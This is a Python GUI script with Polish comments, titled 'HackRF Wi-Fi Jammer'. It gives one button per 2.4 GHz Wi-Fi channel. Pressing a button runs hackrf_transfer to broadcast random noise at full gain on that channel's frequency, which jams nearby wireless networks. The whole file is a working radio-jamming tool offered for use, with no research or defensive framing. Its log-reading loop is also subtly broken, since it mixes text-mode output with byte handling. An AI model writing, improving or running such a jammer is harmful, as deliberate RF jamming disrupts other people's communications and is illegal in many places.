import tkinter as tk
from tkinter import messagebox
import subprocess
import threading

# Lista kanałów Wi-Fi i odpowiadających im częstotliwości (w Hz)
wifi_channels = {
    "Kanał 1": 2412000000,
    "Kanał 2": 2417000000,
    "Kanał 3": 2422000000,
    "Kanał 4": 2427000000,
    "Kanał 5": 2432000000,
    "Kanał 6": 2437000000,
    "Kanał 7": 2442000000,
    "Kanał 8": 2447000000,
    "Kanał 9": 2452000000,
    "Kanał 10": 2457000000
}

# Lista aktywnych procesów HackRF
running_processes = []

# Funkcja do wyświetlania logów w czasie rzeczywistym
def display_logs(process):
    for line in iter(process.stdout.readline, b''):
        line = line.decode('utf-8').strip()
        print(line)  # Wyświetlaj w terminalu
        output_label.config(text=line)  # Wyświetlaj w GUI
    process.stdout.close()

# Funkcja do rozpoczęcia jamowania
def start_jamming(channel_name):
    freq = wifi_channels[channel_name]  # Pobierz częstotliwość dla wybranego kanału
    sample_rate = "20000000"  # Szerokość pasma Wi-Fi
    power = 1  # Włączenie zasilania anteny
    gain = 47  # Maksymalne wzmocnienie

    # Polecenie HackRF
    command = [
        "hackrf_transfer",
        "-t", "/dev/urandom",  # Losowe dane jako źródło
        "-f", str(freq),
        "-s", sample_rate,
        "-p", str(power),
        "-x", str(gain)
    ]

    try:
        # Uruchomienie polecenia HackRF
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        running_processes.append(process)

        # Uruchomienie wątku do wyświetlania logów
        threading.Thread(target=display_logs, args=(process,), daemon=True).start()
        output_label.config(text=f"Jamowanie Wi-Fi na {channel_name} (częstotliwość: {freq} Hz) rozpoczęte!")
    except FileNotFoundError:
        output_label.config(text="Błąd: hackrf_transfer nie został znaleziony!")
        messagebox.showerror("Błąd", "Upewnij się, że HackRF Tools są zainstalowane.")
    except Exception as e:
        output_label.config(text=f"Błąd: {e}")
        messagebox.showerror("Błąd", str(e))

# Funkcja do zatrzymania jamowania
def stop_jamming():
    if running_processes:
        for process in running_processes:
            process.terminate()  # Zatrzymanie procesu HackRF
        running_processes.clear()
        output_label.config(text="Jamowanie zatrzymane.")
    else:
        output_label.config(text="Brak aktywnych procesów do zatrzymania.")

# Tworzenie GUI
root = tk.Tk()
root.title("HackRF Wi-Fi Jammer")

# Dodanie przycisków dla każdego kanału Wi-Fi
button_frame = tk.Frame(root)
button_frame.pack(pady=10)

for channel_name in wifi_channels.keys():
    btn = tk.Button(button_frame, text=channel_name, command=lambda c=channel_name: start_jamming(c), width=15)
    btn.pack(side=tk.LEFT, padx=5)

# Przycisk do zatrzymania jamowania
stop_button = tk.Button(root, text="Zatrzymaj Jamowanie", command=stop_jamming, width=25)
stop_button.pack(pady=10)

# Wyświetlanie statusu
output_label = tk.Label(root, text="Gotowy do działania.", wraplength=400)
output_label.pack(pady=10)

# Start aplikacji
root.mainloop()
